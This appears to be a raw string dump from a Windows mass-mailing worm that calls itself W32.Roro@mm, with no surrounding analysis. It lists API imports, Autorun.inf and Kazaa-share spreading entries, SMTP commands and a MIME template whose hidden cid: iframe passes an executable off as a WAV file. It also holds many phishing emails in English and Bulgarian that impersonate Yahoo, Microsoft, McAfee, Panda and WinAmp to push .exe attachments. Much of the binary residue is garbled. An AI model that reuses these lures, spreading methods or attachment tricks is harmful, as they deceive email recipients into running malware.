            "Vh,A",
            "VhzA",
            "VhxvA",
            "Vh<rA",
            "@VheA",
            "VhaA",
            "Vh,]A",
            "VhSA",
            "SUVWA",
            "D$8WhA",
            "L$8Q$",
            "\u82a1T$8h",
            "\u06a1tbD$8jPj",
            "L$DhA",
            "tCT$8R",
            "D$<hJA",
            "L$8hJA",
            "T$8h",
            "yuSD$8h",
            "5t/L$8h$OA",
            "T$8hOA",
            "RhJA",
            "D$83jPU$H",
            "T$8$",
            "RWhL!A",
            "T$8RP",
            "|$83T$",
            "L$8EjQU$H",
            "uYD$",
            "t)T$",
            "jHRPj",
            "3T$8+3\u06cb$",
            "T$8h",
            "RPhA",
            "ud|$",
            "D$8$<",
            "I|$8\u0443I",
            "s^|$8+$",
            "CED$",
            "}_|$",
            "rD$83jPV$",
            "tTVT$",
            "t=D$8L$",
            "PQhA",
            "\u075cT$8FjRV$",
            "L$<QhA",
            "T$8hA",
            "3\u06c5t~",
            "33+O",
            "3+hA",
            "\u845b_^][x",
            "3\u024dT$",
            "33fN",
            "3+\u047fA",
            "UhxA",
            "SVWPA",
            "QhTA",
            "wtB|$",
            ";u;|$",
            "Ph \"A",
            "\u8ed8u)PA",
            "Qh\"A",
            "mu)PA",
            "L$(3h",
            "T$(h A",
            "PL$0h<A",
            "|$(+\u0443O",
            "PL$0h4A",
            "D$(Ch",
            "hpz@",
            "T$8U",
            "L$(3jQUh A",
            "T$(h,A",
            "L$4h$!A",
            "D$Hh$!A",
            "T$\\h$!A",
            "L$ph$!A",
            "Q\u8c1cP$(",
            "PQiL",
            "hL!A",
            "Qh4A",
            "Ph<A",
            "lT$($",
            "D$(EjPUh A",
            "Qh \"A",
            "PhTA",
            "Qh\"A",
            "<_^[]\u0118",
            "u\t2\u0114",
            "uphA",
            "uLhA",
            "u(hA",
            "SUVW!",
            "UhTA",
            "UhDA",
            "U\u0585D$",
            "_^]2[8",
            "|$@3$D",
            "tPD$$Pj",
            "\u04cbt<L$",
            "QUT$",
            "_^]2[8",
            "3T$`UVWA",
            "L$0QV",
            "T$,R{q",
            "3jPUL$|hA",
            "D$0RP",
            "V\u05cdL$",
            "EjQUT$|hA",
            "u[_^",
            ":t4V",
            "_^UVWu",
            "_^]UQSVW}",
            "t\";\u060br",
            "Yuy}",
            "+;r>})E",
            "YYt.E",
            "UQSVW}",
            "t#;\u020br",
            "W6Sq'",
            "\u07cb}K;M",
            "t\t3u",
            "+PSv",
            "t6t7)E",
            " 3+E",
            "j@t$",
            "VEEE",
            "YY^Vt$",
            "t$V.",
            "YY^j",
            "^S\\$",
            "UVWu",
            "wDVSUL6",
            "Yt$CH;r",
            "PSW%",
            "SU;.",
            "tACH;r",
            "PSWk%",
            "_^][SVt$",
            "3w*;",
            "Yu+Vj",
            "u\"=xA",
            "_^[3UWVu",
            "r)$@",
            "DDDDDDDDDDDDDD",
            "t1|9",
            "^_\u030bL$",
            "tOL$",
            "u^[_3",
            "F8u~a",
            "8u\u010aA",
            "8t3^[_",
            "G^[_",
            "^[_U",
            "fEf;",
            "u;fEf;",
            "u.fEf;",
            "u!fEf;",
            "fEf;",
            "U SVu",
            "3Y}j",
            "B_+^",
            "#[5xA",
            "w\"t$",
            "Yu3Vt$",
            "^UW}",
            "3AOE",
            "_SUVW|$",
            "7G-t",
            "7G3\u06c3=A",
            "7G\u03c3-u",
            "_^][t$",
            "lY\u030dB[",
            "B8t\u0444tQ",
            "u^_[3",
            "B8t6t8t't",
            "t^_B[",
            "B^_[",
            "B^_[",
            "B^_[j",
            "tl<%t2",
            "F>#u",
            "3[]U",
            "SVZW",
            "tnHtS",
            "HHtiHtGH",
            "jd^jdY",
            "HtHHt(",
            "SVWu",
            "SVWu",
            "SVWu",
            "HtOHt)H",
            "39A u",
            "_^[]",
            "F\tu_^UQ3W9",
            "s;IVu",
            "t%SE",
            "_USVu",
            "@;r_^[]UQS]",
            "HtsMt=a",
            "f_^[It",
            "It\"It",
            "V<'t+",
            "It&It",
            "S4It",
            "Wj<E",
            "}\t<V",
            "Y\u0205\u0249M",
            "^]}F",
            "USVWu",
            "_^H[]U}",
            "Vt*u",
            "^_[];}",
            "u3U@",
            "^_U@",
            "3^t$",
            "tKMQP",
            "t<EPEP",
            "to|$",
            "Y3V.",
            "SVEWP",
            "EjdY",
            "_9=\\A",
            "Vq;r",
            "s^h$ A",
            "YYh, A",
            "h( A",
            "YY[u",
            "_Vt$",
            "^Ujh",
            "XSVWe",
            "fu\u040dEP",
            "XPuVV",
            "PEPTE",
            "\tMPQ-",
            "euF=hA",
            "SUVW|$",
            "Y;Yt",
            "3WF9",
            "t\tU7",
            "_^][Vt$",
            "^Vt$",
            "Y^V#",
            "3^SVt$",
            ">+~&WPv",
            "_^[j",
            "YSVW33395",
            "t0|$",
            "P.Yt",
            "_^[Vt$",
            "YtwhA",
            "uR<lA",
            "SW<lA",
            "u SY",
            "X_[^3^",
            "Vt\"t$",
            "t)Vf",
            "PgY^UH",
            "SVW}",
            "G\u06c9uu}",
            "Mu39U",
            "MU\u0309U\u0609UUUUx",
            "*u#E",
            "\u02cdDA\u0409E",
            "It.ht lt",
            "GGM}",
            "HHtpHHtl",
            " M@;\u0289}",
            "Pt;0",
            "PP&6",
            "E}2E",
            ")Zt2\ttH",
            "Yt3H",
            "uHM@E",
            "PPEP",
            "t]EE0",
            "EHEE",
            "E Yt\tfMf",
            "YAE t!E@E",
            "Y3E@t",
            "EEEM",
            "t;ERPWVEU$4",
            "u\u010b\u06030uWV3",
            "]\u050bEM",
            "\ubd4dE+EEE",
            "M90u",
            "]@t&",
            "u+u+u",
            "EPEu",
            "~;E]xf",
            "CPEPCG2",
            "YY~2MQu",
            "Vj q",
            "E_^[@",
            "]VW|$",
            "O~!t$",
            "_^S\\$",
            "KVW~&|$",
            "WFt$",
            "f@USVu",
            "u\"hA",
            "WtdF",
            "WPS{",
            "_WPS(",
            "^[]U",
            "s)ME\t",
            "@\u020d+\u0281",
            "|\u030b+Ej",
            "r3E;",
            "\u01cdMWQu",
            "_^[UWVu",
            "r)$x@",
            "r$x@",
            "r$x@",
            "r$x@",
            "DDDDDDDDDDDDDD",
            "t1|9",
            "^_Vt$",
            "u\tV\t,",
            "tltgV",
            "W;5 ",
            "ubHt",
            "GM9M",
            "_^[UQQSV5xA",
            "3\u06c9]]",
            "rt`+tE",
            "@u}@",
            "rbtHHt.",
            "u@u;@S9]u.E",
            "<9]u",
            "SUV333;W~]",
            ";|?4$j ",
            "_^][3j",
            "j?I_M",
            "!|D\tu+M",
            "j?_M",
            "j?UIZ;\u0289M",
            ";tkMQ",
            "!TD\tu+M",
            "u\t9}",
            "\t8]E",
            "ulSj",
            "_^[U",
            "3uE,",
            ";#M#",
            "r;]uy;\u0609]",
            ";#M#",
            ";uY;]s",
            ";]u&;\u0609]",
            "|D#M#",
            "pD#U#ue",
            "tU3i",
            "MLD#u",
            "j #M_|",
            "j?^;",
            "ua }+",
            "\u04c9]#\\D\\D",
            "M\t|D/}",
            "\t7Mt",
            "VW3;u0DP",
            "_^UQM",
            "SVWq",
            "Cj?i",
            ";w<G",
            "H;v\u01cbEO",
            "_^[U",
            "SVW}",
            "MOI;M",
            "\\9|9]",
            "I?Mv",
            "j?YM_",
            "uH s",
            "!\\D\tu+M",
            "OL1?v",
            "j?_]",
            "BD2G",
            "K\\3u",
            "NK?v",
            "j?^E",
            "j?^O",
            "uG s",
            "j?^M|",
            "\t9DD",
            "X_^[",
            "X3\u030bT$",
            "tG3D$",
            "GJuD$",
            "U$S]",
            "t } u =A",
            "[UQE",
            "ARV5A",
            "QPEPj",
            "u\tD$",
            "S\u060bD$",
            "tAt#t",
            "tt4t'",
            "tAt2t$",
            "\u034dAL$",
            "QSUVW3hH",
            "k<f9-A",
            "f9-\"A",
            "PUj? ",
            "PUj?5A",
            ";\u01634A",
            "V5|A",
            "F_VY0i",
            "F>:uNFVk<Y",
            "F>:u#FVgY",
            "_^][YSVW39=A",
            "Qf9= A",
            "WQPWS",
            ",f9=A",
            "WWWWj",
            "WWSj",
            "WWWj",
            "_^[;|;",
            ":%_E",
            "u+E$",
            "E(k<",
            "^[]UWVSu",
            "F'G8t,A<",
            "A,A<",
            "G8tPS ",
            "[^_Ul$",
            "+@;|",
            "^j<LA",
            "^_[HA",
            "k<+\u0203%`A",
            "VWss\u020b",
            "3t\tP",
            "_^[U",
            "SVW}",
            "E|[W",
            "]t)\u058b",
            "t(;s\":",
            ")EEM",
            "_^[USu",
            "4I+\u044d4A",
            "Y54A",
            "4I4A",
            "<\"u%F",
            "F<\"t",
            "YtF>\"u",
            "F> w",
            "< v^S39",
            "GVYt",
            "PY;5<A",
            "j\tQY=`A",
            "t9UWhYE?=t\"U\u8c7e;Y",
            "j\t\"YW6RY",
            "u]5`A",
            "[UQQS39",
            "EPEPSSWM",
            "YEPEPE",
            "H54A",
            "_^0A",
            "8\"uDP",
            "@\"t)t%",
            "F8\"uF@C",
            "F@ t\tt\t\tu\u0304u",
            "3\u06c08\\u",
            "@C8\"u,",
            "u%39}",
            " t?\tt:}",
            "]QQlA",
            "VW333;u3\u054b;t",
            "@@f9",
            "u@@f9",
            "u+\u018b=D",
            "SS@SSPVSSD$4\u05cb;t2U~;YD$",
            "t#SSUPt$$VSS\u05c5u",
            "LY\\$",
            "uL;u",
            ";t<8",
            "u+@U",
            "UWV\\",
            "3_^][YY",
            "DSUVWh",
            "MY5 ",
            "f|$B",
            "LYt8",
            ";|3\u06e1 ",
            "<4uMF",
            "_^][DUSVWUj",
            "]_^[]",
            "SVWD$",
            "Pjh@",
            "D$ X",
            "t.;t$$t(4v",
            "_^[3d",
            "SQ@A",
            "SQ@A",
            "VC20XC00U",
            "SVWU]",
            "EECs",
            "tEVUk",
            "t3x<{",
            "]_^[]UL$",
            "u*=A",
            "3\u0278PA",
            "PgYY\\WP\\B@Y<v)\\P/\\;j",
            ",_&E",
            "P6YP6j",
            "B=HA",
            "SVW33 ",
            "\u018b\u0603uT",
            "V&Yt3",
            "WsR\u020b",
            "<1u6=A",
            "t78t2=A",
            "t%PYP",
            "P|YA",
            "Yu!j",
            "Y3\u0278HA",
            "|3\u04b9XA",
            "\t BA",
            "|^=TA",
            "]SVD$",
            "3\u060bD$",
            "A\u020b\\$",
            "N3\u048b^[",
            "3P\u020b\\$",
            "#YL$",
            "S3VWE",
            "]t\t]E",
            "^#+t-Ht!Ht",
            "t& t",
            "5t.;t*;t",
            "t\t;t",
            "VuEPuuu",
            "uxttE",
            "tM?e",
            "uSi\t",
            "_^[Ujh8",
            "SVWe|A",
            "3;u>EPj",
            "^Vh4",
            "EPVhA",
            "E;tc]<",
            "euWSV*",
            "e33M;t)uVu",
            "3e\u030bMd",
            "_^[\u030bL$",
            "WtzVS\u064bt$",
            "GIt%t)",
            "Gt/KuD$",
            "GKu[^D$",
            "t\u0784t,t",
            "[^_\u030bT$",
            "t&:a",
            "SV5<A",
            "Wteu",
            "95DA",
            "uP5<A",
            "tF\\$",
            "t>SY",
            "t/P;Yv",
            "<8=u",
            "WSPh",
            "3_^[UQ=A",
            "SVWu",
            ";^}%95A",
            "VSYY",
            "X#\u0185u",
            "]\tX\te\t",
            "PW5A",
            " t;u",
            "_^[j",
            "SVWu",
            "Y;5A",
            "3\u04b8XA",
            "90tr0B=HA",
            "|EPV",
            "j@3YA",
            "@j@3YA",
            "@;vAA9",
            "UAAy",
            "Wj@Y3A",
            "EVP5A",
            "@;rE\u0185 t7SWU",
            "A    ",
            "BBBu_[j",
            "PVPj",
            "VPVPV5A",
            "VPVPh",
            "@AA;rI3",
            " \u0200 A",
            "@;r^",
            "VWuBht",
            ";tg5@",
            "tPhX",
            "S\u040bt$",
            "_^[3VWj",
            "3^95",
            "P<Yt",
            "|_^j",
            "+~oh",
            "VPsh",
            "YY@}>j",
            "S.S$",
            "^[Q=",
            "s+\u020b\u0105",
            "3]5A",
            "]QSUV5DA",
            "WWWWjPWj",
            "\u04cb;t>U);YD$",
            "t/WWUPj6Wj",
            "Y;Yu3_^][Y",
            "SVWe39=A",
            "uFWWj",
            "[Sh4",
            "\"WWShA",
            "9} u",
            "E WWu",
            "@Pu ",
            "$\"e\u0109E\u0703M",
            "e3}\u0703M]9}tfSuu",
            "tMWWSuu",
            "u;t2E",
            "t@9}",
            "3e\u020bMd",
            "_^[E",
            "$ne\u0709]M",
            "e33\u06c3Mu;tVSuuu",
            "VSh ",
            "qlD$",
            "^Ujh",
            "0SVWe39",
            "_u@W4",
            "PWPSS",
            "PWPSS",
            "9] u",
            "E ;t\t9]",
            "AEPu ",
            ";~,}",
            "r\"E8]t",
            ":v@@8",
            "rE8]tP",
            "x@@8",
            "uzSSVu",
            "j\tu ",
            "$e\u0109E\u0703M",
            "e3\u06c9]\u0703Mu",
            "uuVu",
            "Wu 5",
            "\u0585tySSu",
            "j\tu \u058bu;ta}",
            "$re}\u0603M",
            "e33Mu;t-VWu",
            "VWuuu",
            "3eMd",
            "@Iu8",
            "UQQSVW39}",
            "tUj=u",
            "Y;Yut@9u",
            "t;<A",
            ";uT9}",
            "9=DA",
            "t>_^[;",
            "/;Y<A",
            "t\u07c989=DA",
            ";YDA",
            "t\u01098+u",
            "YY|C?",
            "t>t24<\u0215Y?",
            "Pu\u0615YYt<5E",
            "2uz}",
            "PW\u8c15YY",
            "@@P`YYt.u",
            "Y3V5<A",
            "t-|$",
            "WPt$",
            "8<=t",
            "VP\u869bYu",
            "j\t\tY",
            "^][_U=A",
            "\u855cYY]",
            "#]Vt$",
            "V@P\u06daYYt",
            "VPYY^3^%$",
            "t=SWj",
            "UWV}",
            "OO;s",
            "'FO^_U}",
            "SVWt",
            "Aw\u0680!",
            "IG;r_^[]UQA",
            "]u!E",
            "ugVWj",
            "SSSj",
            "VP7 ;t8W",
            ";YEt*j",
            "SWPju",
            "YYu\u02d1E",
            "Y_^[",
            "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/",
            "H:mm:ss",
            "dddd, MMMM dd, yyyy",
            "M/d/yy",
            "December",
            "November",
            "October",
            "September",
            "August",
            "July",
            "June",
            "April",
            "March",
            "February",
            "January",
            "Saturday",
            "Friday",
            "Thursday",
            "Wednesday",
            "Tuesday",
            "Monday",
            "Sunday",
            "am/pm",
            " (8PX",
            "700WP",
            "`h````",
            "ppxxxx",
            "(null)",
            "SunMonTueWedThuFriSat",
            "JanFebMarAprMayJunJulAugSepOctNovDec",
            "runtime error ",
            "TLOSS error",
            "SING error",
            "DOMAIN error",
            "R6028",
            "- unable to initialize heap",
            "R6027",
            "- not enough space for lowio initialization",
            "R6026",
            "- not enough space for stdio initialization",
            "R6025",
            "- pure virtual function call",
            "R6024",
            "- not enough space for _onexit/atexit table",
            "R6019",
            "- unable to open console device",
            "R6018",
            "- unexpected heap error",
            "R6017",
            "- unexpected multithread lock error",
            "R6016",
            "- not enough space for thread data",
            "abnormal program termination",
            "R6009",
            "- not enough space for environment",
            "R6008",
            "- not enough space for arguments",
            "R6002",
            "- floating point not loaded",
            "Microsoft Visual C++ Runtime Library",
            "Runtime Error!",
            "Program: ",
            "<program name unknown>",
            "GetLastActivePopup",
            "GetActiveWindow",
            "MessageBoxA",
            "user32.dll",
            "SetFileAttributesA",
            "GetWindowsDirectoryA",
            "WritePrivateProfileStringA",
            "GetPrivateProfileStringA",
            "GetPrivateProfileIntA",
            "GetPrivateProfileSectionNamesA",
            "GetPrivateProfileSectionA",
            "GetComputerNameA",
            "GetShortPathNameA",
            "CopyFileA",
            "DeleteFileA",
            "GetModuleFileNameA",
            "CreateDirectoryA",
            "lstrlenA",
            "GetTempFileNameA",
            "GetTempPathA",
            "FreeLibrary",
            "GetProcAddress",
            "LoadLibraryA",
            "WaitForSingleObject",
            "CreateThread",
            "WinExec",
            "CreateEventA",
            "GetSystemDirectoryA",
            "CloseHandle",
            "TerminateThread",
            "WaitForMultipleObjects",
            "Sleep",
            "ExitThread",
            "FindNextChangeNotification",
            "FindFirstChangeNotificationA",
            "GetDriveTypeA",
            "GetLogicalDriveStringsA",
            "SetThreadPriority",
            "SetEvent",
            "GetModuleHandleA",
            "GetLastError",
            "CreateMutexA",
            "SetLastError",
            "GetVersionExA",
            "TerminateProcess",
            "GetExitCodeProcess",
            "OpenProcess",
            "KERNEL32.dll",
            "FindWindowA",
            "ShowWindowAsync",
            "MessageBoxA",
            "CharToOemA",
            "PostMessageA",
            "GetWindowTextA",
            "EnumWindows",
            "USER32.dll",
            "RegCloseKey",
            "RegQueryValueExA",
            "RegEnumValueA",
            "RegSetValueExA",
            "RegOpenKeyExA",
            "RegNotifyChangeKeyValue",
            "ADVAPI32.dll",
            "WS2_32.dll",
            "WNetCloseEnum",
            "WNetCancelConnection2A",
            "WNetAddConnection2A",
            "WNetEnumResourceA",
            "WNetOpenEnumA",
            "MPR.dll",
            "RasGetConnectStatusA",
            "RasEnumConnectionsA",
            "RASAPI32.dll",
            "HeapFree",
            "HeapReAlloc",
            "HeapAlloc",
            "GetTimeZoneInformation",
            "GetSystemTime",
            "GetLocalTime",
            "FindFirstFileA",
            "FindNextFileA",
            "FindClose",
            "FileTimeToSystemTime",
            "FileTimeToLocalFileTime",
            "ExitProcess",
            "GetCurrentProcess",
            "GetStartupInfoA",
            "GetCommandLineA",
            "GetVersion",
            "WriteFile",
            "ReadFile",
            "HeapDestroy",
            "HeapCreate",
            "VirtualFree",
            "VirtualAlloc",
            "WideCharToMultiByte",
            "SetFilePointer",
            "UnhandledExceptionFilter",
            "FreeEnvironmentStringsA",
            "FreeEnvironmentStringsW",
            "GetEnvironmentStrings",
            "GetEnvironmentStringsW",
            "SetHandleCount",
            "GetStdHandle",
            "GetFileType",
            "RtlUnwind",
            "SetStdHandle",
            "FlushFileBuffers",
            "CreateFileA",
            "MultiByteToWideChar",
            "GetStringTypeA",
            "GetStringTypeW",
            "GetCPInfo",
            "GetACP",
            "GetOEMCP",
            "SetEndOfFile",
            "LCMapStringA",
            "LCMapStringW",
            "CompareStringA",
            "CompareStringW",
            "SetEnvironmentVariableA",
            "%s\\%s.%s",
            "%s\\%s%s.exe",
            "Rundll",
            "%s\\%s%s.%s",
            "%s%s",
            "WinFile",
            "%s\\Win.ini",
            "WinIni",
            "NULL",
            "OTHER",
            "Options",
            "Country",
            "SETUP",
            "faith",
            "REMOTE",
            "LOCAL",
            "FOLDER",
            "[Autorun]",
            "OPEN=%s",
            "Autorun.inf",
            "%s\\%s",
            "NETWORK",
            "NETWORK-%s",
            "SEXY",
            "KaZaA",
            "012345:%s",
            "Dir%d",
            "DisableSharing",
            "SOFTWARE\\Kazaa\\LocalContent",
            "%s\\Profiles",
            "%s.tmp",
            "_%s_",
            "MAIL-FLOOD",
            "Sent_%d",
            "UnSent",
            "Outbox",
            "NewItems",
            "Status",
            "MAIL-%s",
            "SMTP Server",
            "Software\\Microsoft\\Internet Account Manager\\Accounts\\%s",
            "Software\\Microsoft\\Internet Account Manager",
            "Default Mail Account",
            "%s.%s",
            "Info",
            "mail|smtp",
            "Quit",
            "Data",
            "Rcpt To: <%s>",
            "Mail From: <%s>",
            "HELO %s",
            "------=_NextPart_000_0009_01C25403.00F9C840--",
            "Content-Type: application/x-msdownload; name=\"%s\"",
            "Content-Disposition: attachment; filename=\"%s\"",
            "Content-Transfer-Encoding: base64",
            "Content-Type: audio/x-wav; name=\"%s\"",
            "Content-ID: <ROROREJERIBA>",
            "<FONT></FONT></BODY></HTML>",
            "<iframe src=3Dcid:ROROREJERIBA height=3D0 width=3D0></iframe>",
            "<HTML><HEAD></HEAD><BODY>",
            "Content-Type: text/html; charset=\"us-ascii\"",
            "Content-Transfer-Encoding: quoted-printable",
            "Content-Type: text/plain; charset=\"us-ascii\"",
            "------=_NextPart_000_0009_01C25403.00F9C840",
            "This is a multi-part message in MIME format.",
            "X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2615.200",
            "X-Mailer: Microsoft Outlook Express 5.00.2615.200",
            "X-MSMail-Priority: Normal",
            "X-Priority: 3",
            "Content-Type: multipart/mixed; boundary=\"----=_NextPart_000_0009_01C25403.00F9C840\"",
            "MIME-Version: 1.0",
            "Subject: %s",
            "Date: %s",
            "To: <%s>",
            "From: <%s>",
            "%d %b %y %H:%M:%S",
            "IRC %s %s",
            "RNA %s %s",
            "..|!!| :)| ;))| :pPpP| ~pPp| :>|!| ;)",
            "HeY|ZzZz|Bla Bla|HoWie|Happy|Hi Again|Wow|Hi|Hello|Hey Ya|Boom|Hi There",
            "Zdrasti|Zdr Otnovo|Ohoo|Ei dupe|Pisamce|TinKi WinKy|ZzZz|Bla Bla|Hey|Privet|Boom",
            "P.S. Have you visited %s :) Co0l :))",
            "P.S. Be happy, don't worry ~pPp. Check this - %s Cool :))",
            "P.S. Bqgai na %s mnoo zdravo flash4e ima :pP",
            "P.S. Hvarli edno oko na %s :))",
            "Yahoo!Toolbar.exe",
            "support@yahoo.com",
            "Yahoo! Team is proud to present our new surprise",
            "for clients of Yahoo! and Yahoo! Mail.",
            "Yahoo! Toolbar is an innovative technology, which",
            "helps you to access Yahoo! Services easier than ever.",
            "It is free and is a gift for the 5th anniversary of Yahoo!.",
            "We hope that you would like it.",
            "The whole Yahoo! Team want to express our gratitude to you,",
            "the people who help us to improve Yahoo! so much, that it",
            "became the most popular worldwide portal.",
            "Thank You!",
            "We do our best to serve you.",
            "-------------",
            "Yahoo! Team.",
            "www.Yahoo.com",
            "Yahoo! Toolbar_",
            "IE_0276_Setup.exe",
            "support@microsoft.com",
            "McAfee Antivirus warns about a new virus, called W32.Roro@mm.",
            "It is a high risk worm and it's using IRC and internet pages",
            "to infect computers. The virus deletes movies, music and",
            "system files.",
            "Due to the significant increase of infected users,",
            "Microsoft Corporation, with the collaboration of",
            "McAfee Antivirus, supports clients of Microsoft Windows",
            "with  patch, which fixes a bug in Internet Explorer 5.5",
            "or minor versions. This bug allows internet pages",
            "to grant access to local resources of visitors.",
            "-----------------",
            "McAfee Antivirus",
            "www.McAfee.com",
            "Virus Alert_",
            "support@winamp.com",
            "Iguana1.0_skin.exe",
            "[TNT]Gen.exe",
            "Hello :)) How are you? Do you remember me? I hope so :)) I've just",
            "watched Tomcats, it's marvellous :pP. The summer vacation is over and",
            "this is quite unpleasent :(( I have a lot to tell you about, later..",
            "You can't guess what I've found.. A working Credit Card generator :)))",
            "I purchased a bride from Russia yesterday :) LoL.. I gave a fake address",
            "of course :))) Don't go too far and watch out :))  I'll be very happy",
            "if you write to me soon :))) Bye..",
            "Yahoo!Autumn.exe",
            "Blondes.exe",
            "Hey, whatz up :)) Where are you? Don't you chat any more?",
            "I haven't seen you so long. Read this :))",
            " - What do blondes wear behind their ears to attract men? Their ankles!!",
            " - Why did god invent the female orgasm? So blondes know when to stop screwing!!",
            " - What is a blond with hair black colored? Artificial intelligence!",
            "Blondes forever!! :) Time off, i must go now, but i'll be very",
            "happy if you write to me soon :) Bye bye :))",
            "Blondes Forever",
            "Hi again :)) Where are you? Don't you chat any more? I haven't",
            "seen you so long.. Well, I've got a lot to tell you about. The",
            "Summer vacation was too good to be true. Beach, disco's, friends..",
            "Unfortunately, it's Winter now and the temperatures here are very",
            "low. I was ill almost 2 weeks. Quite unpleasant :(( Let's talk",
            "about you :) Are you oK? Are you in love :)) I sent you a surprise :))",
            "There are cool thoughts, especially about love. It's nice. I'm a",
            "little bit bored of these stupid computers, but I'm waiting for",
            "the reply :)) Bye!",
            "Hi again :)) Where are you? Don't you chat any more? I haven't",
            "seen you so long :)) Well, I've got a lot to tell you about. The",
            "Summer vacation was too good to be true. Beach, disco's, friends..",
            "Unfortunately, it's Winter now and the temperatures here are very",
            "low. I was ill almost 2 weeks. Quite unpleasant :(( Have you",
            "visited %s. A little bit strange, but nice :))",
            "Finally, how are you? Write to me :)) Byeee :pP",
            "Hey :) Wasupp ~Pp I wanted to write you a letter, but i didn't",
            "know what to talk about actually :) Have you ever done an IQ test?",
            "I've just scored 120 points :) I'm not sure if this good or bad is,",
            "but who cares :) Have you visited %s :) Finally,",
            "how are you:) I'll be very happy if you send me 1,2 funny cards :)) bye! :)",
            "Hello, WinAmp User. WinAmp Team is proud to present our new",
            "surprise for users of WinAmp. WinAmp 3.0 Final has been just",
            "released and we believe that it will be the player you've ever",
            "dreamed about.",
            "We plan to start a new tradition, sending the best skin or",
            "add-on to our users every week. This new service is free and",
            "we hope that you would like it.",
            "Everyone can offer us suggestions.",
            "We do our best to serve you.",
            "----------------",
            "WinAmp Team.",
            "www.WinAmp.com",
            "WinAmp Team_",
            "alert@computel.bg",
            "IE50_032_Setup.exe",
            "Panda Antivirus preduprejdava za nalichieto na nov virus",
            "v internet, narechen W32.Roro@mm. Razprostranqva se predimno",
            "po IRC i chrez zarazeni internet stranici. Sled zarazqvaneto",
            "toi iztriva mp3-ki, filmi i dokumenti.",
            "Poradi golemiq broi zarazeni bulgari prez poslednite",
            "nqkolko dena, Panda Antivirus zapochna razprostranenieto na",
            "patch, koito opravq bug v Internet Explorer 5.5 i minali",
            "versii, pozvolqvasht na stranici sas zlovredno sudurjanie",
            "da izpulnqvat komandi vurhu posetitelite.",
            "Druga nasha preporuka e ako ste veche zarazeni da ne",
            "opitvate da mahate virusa ruchno, a samo s antivirusna",
            "programa, poneje pri neuspeshen opit za premahvane W32.Roro",
            "iztriva razlichni vidove failove na operacionnata sistema.",
            "------------------",
            "Panda Antivirus, Bulgaria.",
            "www.Computel.bg",
            "Vajno_",
            "bg@microsoft.com",
            "IE_0274_bg.exe",
            "Blagodarenie na dulgogodishnite tradicii na Microsoft v Bulgaria",
            "i dobrata i suvestna rabota na vsichki neini podchineni, mojem",
            "nai-nakraq da pozdravim bulgarskiq potrebitel s prevod na",
            "Internet Explorer na bulgarski.",
            "Tova e edno uspeshno produljenie na iniciativata za prevejdane na",
            "Ms Office 2000  na rodniq ni ezik. Update-a e bezplaten i e",
            "podaruk po sluchai 10 godishninata na Microsoft v Bulgaria.",
            "Nadqvame se bulgarskite potrebiteli da ostanat dovolni, koeto shte",
            "bude nai-golemiq podaruk za nas.",
            "---------------------",
            "Microsoft, Bulgaria.",
            "Microsoft Bulgaria_",
            "Zdrasti, ko staa :))) Baq vreme ne sme se chuvali. Beshe mi",
            "skuchno i si vikam shto da ne napisha nqkoi drugo pismo :))",
            "Sq i tva daskalo i napravo ujas, ne sa jivee :) Ti ostai drugoto",
            "ami i e studeno.. ~PpPp. Dano idva vakanciqta po skoro :)) Pishi",
            "neshto interesno, kak q karash, neshto novo ima li :) Pratih ti",
            "onva deto obeshtah, qko a :)) Aide i chakam..",
            "Yahoo!Tomcats.exe",
            "greetings@reply.yahoo.com",
            "Surprise! You've just received a Yahoo! Greeting",
            "from \"%s\" (%s)!",
            "This is an interactive greeting card",
            "and requires Flash Media Player.",
            "Enjoy!",
            "The Yahoo! Greetings Team.",
            "-----------------",
            "Yahoo! Greetings is a free service. If you'd like to send someone a",
            "Yahoo! Greeting, you can do so at http://greetings.yahoo.com",
            "%s sent you a Yahoo! Greeting_",
            "support@games.yahoo.com",
            "Yahoo!Chess.exe",
            "Yahoo! Team is proud to present our new surprise",
            "for clients of Yahoo! and Yahoo! Mail.",
            "We plan to send you the best Yahoo! Games weekly.",
            "This new service is free and it's a gift for the 5th",
            "anniversary of Yahoo!. We hope that you would like it.",
            "The whole Yahoo! Team want to express our gratitude to",
            "you, the people who help us to improve Yahoo! so much,",
            "that it became the most popular worldwide portal.",
            "Thank You!",
            "We do our best to serve you.",
            "-------------",
            "Yahoo! Team.",
            "www.Yahoo.com",
            "Yahoo! Games_",
            "support@kefche.com",
            "Ekiput na Kefche.com ima radostta da pozdravi vsichki",
            "fenove na Kefcheto s 1-ta godishnina ot puskaneto na site-a.",
            "Nie se prevurnahme v nai-dobriq i poseshtavan bg site",
            "za zabavleniq i igri. Ot samoto si nachalo Kefche.com ima",
            "za cel da vi nosi samo i edinstveno smqh i zabava,",
            "nadqvame se che sme postignali celite si :))",
            "Po sluchai godishninata, ekiput ni poe iniciativata da",
            "izprashta vsqka sedmica nai-dobrite flash-cheta i",
            "igrichki na vsichki user-i poseshtavashti Kefche-to.",
            "Nadqvame se da vi haresa i tova da bude samo nachaloto",
            "na edno novo zabavlenie :))",
            "-----------------",
            "Kefche.com Team.",
            "Kefche.com_",
            "Blondies.exe",
            "Hey :)) Kak q karash? Pomnish li me oshte :))",
            "Nadqvam se che da. Baq vreme ne sme sa chuvali..",
            "Neshto novo ima li? Namerih edna mnoo qka programka",
            "i neznam zashto, no mi napomni za teb :))",
            "Kakvo pravi blondinka kato rodi bliznaci? - Chudi se koi e vtoriq tatko :)",
            "Kakva e razlikata mejdu 10 ovce i 3 blondinki? Otgovor: 7",
            "Kak mojesh da razsmeesh blondinka v petak? - Kato i razkajesh vic vav vtornik :)",
            "Kefqt li ta vicovete? Shegichka de :) Razkazva vicove na 5 minuti :))",
            "Posmqh se za baq vreme napred :pPpP Haide bye za sega, i da pishesh :))",
            "Blondinkii",
            "Hey :) Kak si? Otdavna ne sme se chuvali :)) Kak q karash, neshto",
            "novo ima li? Nqma da povqrvash kakvo mi se sluchi neska :)",
            "Vidqh Slavi Trifonov i nqkvi mnoo qki madami s nego :))) Ko shi kajesh a?",
            "Misleh da mu iskam avtograf ama me dosramq :(( Karai, drug pat ~pP.",
            "Skoro shti pratq onva deto obeshtah, za sq mojesh da hvarlish edno",
            "oko na %s - ako imash nqkvi predlojeniq",
            "pishi mi :)) Aide doskoro i umnata ~pP",
            "Zdravei :)) Da ne me zabravi ve4e :) Ko praish? Za teb neznam",
            "ama v momenta se chustvam mnoo qko i reshih da ti pisha :) Kolko",
            "ti e rekorda na minichkite? Toku shto na Expert razminirah za 2 minuti :))",
